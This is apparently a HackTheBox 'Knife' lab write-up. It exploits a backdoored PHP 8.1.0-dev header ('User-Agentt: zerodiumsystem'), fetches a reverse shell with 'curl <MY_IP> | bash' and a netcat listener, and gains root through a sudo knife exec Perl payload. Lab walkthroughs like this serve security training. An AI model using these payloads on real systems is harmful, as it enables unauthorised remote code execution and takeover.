# Knife Writeup

### objetives
* user flag
* root flag

---

## Basic Enumeration

the ICMP TTL tells us that its a Linux Machine

nmap :
* p22	OpenSSH 8.2p1 Ubuntu
* p80	Apache httpd 2.4.41

### web

the main page is really plain and there isn't that much going on  
so we try to find something interesting on the headers or using the different **HTTP Verbs**  
there is a pretty interesting Header though: *X-Powered-By: PHP/8.1.0-dev*  
we google this version and there is a vulnerability that leads to RCE, thats great !!!

---

## User Flag

the way to exploit this vulnerability is by sending the following header to the server :  
`User-Agentt: zerodiumsystem('<command>');`  
we use it to get a reverse shell the following way:
* i create a file called *index.html* with a bash script that leads to a reverse shell at port 443
* i start a server on the folder where the script is stored
* i start a nc listener at port 443
* i use the RCE to execute the command `curl <MY_IP> | bash`
* the reverse shell should appear on your netcat listener

we get the User Flag at */home/james*

---

## Root Flag

with `sudo -l` we see that we can use the command `/usr/bin/knife` as root  
we type `/usr/bin/knife -h` and there is a link to the docs at [https://docs.chef.io/workstation/knife/](https://docs.chef.io/workstation/knife/)  
we search about the command and we discover that it can execute perl scripts  
we try the GTFOBins payload for sudo with Perl to get that beloved root shell  
we type `sudo /usr/bin/knife exec -E 'exec "/bin/sh"'`...and Boom !!
now we can get our well-deserved root flag !!!!!

---

## Conclusions

I believe this to be the easiest HackTheBox machine i've tried so far, even though you probably need to be aware enough to understand that there's nothing on the website and you have to check something a little bit hidden like an PHP version in a header, this machine shouldn't be a challenge for most of pentesters


